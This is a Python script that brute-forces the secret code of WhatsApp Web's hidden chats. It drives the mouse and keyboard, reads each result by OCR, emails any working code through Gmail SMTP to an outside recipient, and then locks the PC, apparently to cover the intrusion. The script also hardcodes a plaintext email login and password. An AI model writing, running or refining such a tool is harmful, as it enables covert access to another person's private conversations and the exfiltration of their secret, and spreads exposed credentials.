```python
import pyautogui
import time
import pytesseract
from PIL import Image
import cv2
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import ctypes

# Set the path to the Tesseract OCR executable
pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'  # Update this path

# Coordinates of the WhatsApp Web search bar (replace with your own)
search_bar_coords = (170, 203)  # Replace x and y with actual coordinates

# List of right-side letters (excluding 'M', 'P', 'L', 'O')
right_side_letters = ['Y', 'U', 'I', 'G', 'H', 'J', 'K', 'V', 'B', 'N']

# Middle letters to test (e.g., 'JJ', 'HH', 'KK', 'NN')
middle_letters = ['J', 'H', 'K', 'N']

# Delay between actions
delay_between_actions = 1.5  # seconds

# Email configuration
smtp_server = 'smtp.gmail.com'  # Replace with your SMTP server
smtp_port = 587  # Replace with your SMTP port
sender_email = 'shipharryhermoine@gmail.com'  # Replace with your email
sender_password = 'HARRYhermoine@12345'  # Replace with your email password or app password
receiver_email = 'deep16200216@gmail.com'  # Replace with recipient's email

# Function to enter a code into the search bar
def enter_code(code):
    pyautogui.click(search_bar_coords)
    time.sleep(0.5)
    pyautogui.hotkey('ctrl', 'a')  # Select all text
    pyautogui.press('backspace')   # Clear the search bar
    pyautogui.typewrite(code)
    time.sleep(delay_between_actions)

# Function to capture and analyze screenshot
def analyze_screenshot(code):
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')
    image = cv2.imread('screenshot.png')
    text = pytesseract.image_to_string(image)
    if 'Known Keyword' in text:  # Replace with actual keyword
        with open('successful_codes.txt', 'a') as file:
            file.write(f'Successful code: {code}\n')
        print(f'Hidden chat detected with code: {code}')
        return True
    return False

# Function to send email notification
def send_email(code):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = 'Hidden WhatsApp Chat Unlocked'
    body = f'The hidden chat was unlocked using the secret code: {code}'
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        server.send_message(msg)
        server.quit()
        print('Email sent successfully.')
    except Exception as e:
        print(f'Failed to send email: {e}')

# Function to lock Windows workstation
def lock_workstation():
    ctypes.windll.user32.LockWorkStation()

# Main loop to test codes
try:
    for middle in middle_letters:
        for first in right_side_letters:
            for last in right_side_letters:
                code = f"{first}{middle}{middle}{last}"
                print(f'Testing code: {code}')
                enter_code(code)
                if analyze_screenshot(code):
                    send_email(code)
                    lock_workstation()
                    exit()
    print('No hidden chat detected with the tested codes.')
except Exception as e:
    print(f'An error occurred: {e}')
```
